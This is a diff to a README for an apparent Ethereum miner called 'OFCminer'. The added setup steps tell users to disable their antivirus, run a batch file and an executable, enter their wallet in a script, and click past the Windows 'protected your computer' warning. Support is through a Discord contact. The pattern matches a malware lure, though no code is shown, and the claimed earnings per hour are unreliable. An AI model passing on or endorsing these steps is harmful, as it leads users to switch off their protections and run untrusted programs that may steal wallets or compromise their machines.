@@ -4,14 +4,20 @@ A etherum miner that extract with a RTX2070 ~0,0037ETH or ~7.69$ per hour and wi
 
 
 Setup :
+
+Before download:
+
 disable your antivirus
+
+After download:
+
 click on PythonInstaller.bat
 click on walletsetup.py and enter your wallet
 click on OFCminer.exe
+If it says "Windows protected your computer" Just click on "complementary information" and then click on "ignore
 (if it is not launching add DiscodoBaguette#8369 on Discord)
 then if it lauch select your parameter !
 (click on bal.py to see your balance)
-(click on miningrate.py to see mining rate !)
 
 
 We take 1.2% of the ETH you mine
